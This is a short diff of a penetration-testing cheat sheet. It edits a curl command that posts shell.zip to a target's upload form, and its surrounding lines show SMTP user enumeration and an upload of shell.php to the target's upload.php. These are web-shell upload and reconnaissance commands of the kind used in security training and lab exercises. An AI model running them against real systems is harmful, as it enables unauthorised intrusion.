@@ -100,7 +100,7 @@ smtp-user-enum -U /usr/share/wordlists/names.txt -t $TARGET -m 150
 curl -X POST -F "file=@/file/location/shell.php" http://$TARGET/upload.php --cookie "cookie"
 
 # POST binary data to web form
-curl -F "field=<shell.zip" http://$TARGET/upload.php -F 'token=00' --cookie "adm=1; " -F "submit=true" -L -v
+curl -F "field=<shell.zip" http://$TARGET/upld.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
 ```
 
 #### Generating Payload Pattern & Calculating Offset
